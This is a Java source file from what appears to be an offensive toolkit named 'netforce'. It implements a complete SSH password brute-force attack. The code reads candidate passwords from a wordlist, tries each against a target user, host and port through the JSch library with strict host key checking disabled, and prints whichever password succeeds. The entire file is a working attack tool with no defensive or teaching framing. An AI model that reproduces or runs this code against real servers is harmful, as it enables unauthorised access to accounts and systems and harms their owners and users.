package com.github.thatcherdev.netforce;

import java.io.File;
import java.util.Scanner;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class Bruteforce {

	/**
	 * Start a brute force attack on an SSH server with user {@link user} at host
	 * {@link host} with port {@link port} and timeout {@link timeout} using
	 * wordlist {@link file}.
	 *
	 * @param host    host of SSH server to brute force
	 * @param port    port of SSH server
	 * @param user    user to brute force
	 * @param file    name of wordlist file contains passwords to brute force
	 * @param timeout timeout for connecting to SSH server
	 */
	public static void start(String host, int port, String user, String file, int timeout) {
		Scanner in = null;
		try {
			System.out.println("Brute forcing " + user + "@" + host + ":" + port + "\n");
			in = new Scanner(new File(file));
			while (in.hasNextLine()) {
				String password = in.nextLine();
				System.out.print("\033[2K\033[56DTrying password '" + password + "'");
				try {
					check(host, port, user, password, timeout);
					System.out.println(
							"\033[2K\033[56DPassword for " + user + "@" + host + ":" + port + " is '" + password + "'");
					return;
				} catch (Exception e) {
					if (e.getMessage().equals("Auth fail"))
						continue;
					else
						throw new Exception();
				}
			}
			System.out.println("\033[2K\033[56DCould not get password for " + user + "@" + host + ":" + port);
		} catch (Exception e) {
			System.out.print("\033[2K\033[56D");
			e.printStackTrace();
		} finally {
			if (in != null)
				in.close();
		}
	}

	/**
	 * Attempt to connect to an SSH server with user {@link user} at host
	 * {@link host} with port {@link port}, password {@link password}, and timeout
	 * {@link timeout}.
	 *
	 * @param host     host of SSH server
	 * @param port     port of SSH server
	 * @param user     user to login to
	 * @param password password to user to login
	 * @param timeout  timeout for connecting to SSH server // * @return if login
	 *                 was successful
	 * @throws JSchException
	 */
	private static void check(String host, int port, String user, String password, int timeout) throws JSchException {
		JSch jsch = new JSch();
		Session session = jsch.getSession(user, host, port);
		session.setConfig("StrictHostKeyChecking", "no");
		session.setTimeout(timeout);
		session.setPassword(password);
		session.connect();
		session.disconnect();
	}
}
